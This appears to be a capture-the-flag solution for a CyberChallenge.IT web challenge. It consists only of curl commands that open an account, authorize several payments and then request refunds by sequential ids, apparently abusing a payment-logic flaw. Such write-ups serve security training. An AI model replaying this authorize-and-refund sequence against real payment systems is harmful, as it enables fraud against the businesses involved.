```c
curl -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/new_account.php"
```

```c
curl -b cookies.txt -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/authorize_payment.php?amount=50"
curl -b cookies.txt -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/authorize_payment.php?amount=50"
curl -b cookies.txt -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/authorize_payment.php?amount=50"
curl -b cookies.txt -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/authorize_payment.php?amount=50"
```

```c
curl -b cookies.txt -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/refund_payment.php?id=0"
curl -b cookies.txt -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/refund_payment.php?id=1"
curl -b cookies.txt -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/refund_payment.php?id=2"
curl -b cookies.txt -c cookies.txt "http://evilcorp.challs.cyberchallenge.it/refund_payment.php?id=3"
```